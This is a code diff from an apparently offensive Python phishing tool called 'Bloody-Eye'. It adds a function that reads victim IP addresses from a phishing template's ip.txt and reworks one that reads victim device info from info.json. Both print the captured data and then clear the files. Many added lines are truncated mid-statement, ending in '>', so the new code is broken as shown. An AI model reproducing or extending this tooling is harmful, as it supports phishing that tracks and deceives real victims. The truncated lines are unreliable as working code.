@@ -574,28 +574,44 @@ exit();""")
                     a.close()
             except:
                 None
+# Getting IP Address
+    def readip():
+        global stat_file
+        if not str(os.stat('../Bloody-Eye/templates/phishing/ip.txt')>
+            stat_file = str(os.stat('../Bloody-Eye/templates/phishing>
+            fileip =  open('../Bloody-Eye/templates/phishing/ip.txt',>
+            i = fileip.readlines()
+            try:
+                i = i[-1]
+                print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+>
+                print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+>
+                o = open("../Bloody-Eye/templates/phishing/ip.txt","w>
+                o.write("")
+                o.close()
+            except:
+                None
 # Getting Victim Info
     def info():
             global stat_file
-            if not str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size) == stat_file:
-                stat_file = str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size)
-                fileip = open("../Bloody-Eye/templates/phishing/info.json","r")
+            if not str(os.stat('../Bloody-Eye/templates/phishing/info>
+                stat_file = str(os.stat('../Bloody-Eye/templates/phis>
+                fileip = open("../Bloody-Eye/templates/phishing/info.>
                 b = fileip.read()
             try:
                 infor = json.loads(b)
                 for value in infor['dev']:
-
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.GREEN+" Victim IP Found")
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Victim's IP : "+Fore.WHITE+value['Ip'])
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Saved in :"+Fore.YELLOW+" /templates/phishing/"+Fore.RED+"info.json")
-                    a = open("../Bloody-Eye/templates/phishing/info.json","w")
+                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+>
+                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+>
+                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+>
+                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+>
+                    a = open("../Bloody-Eye/templates/phishing/info.j>
                     b = a.write("")
-
                     a.close()
             except:
                 None
     while True:
         userin()
+        readip()
         info()
   except:
      with open("logs/exit","w") as kill:
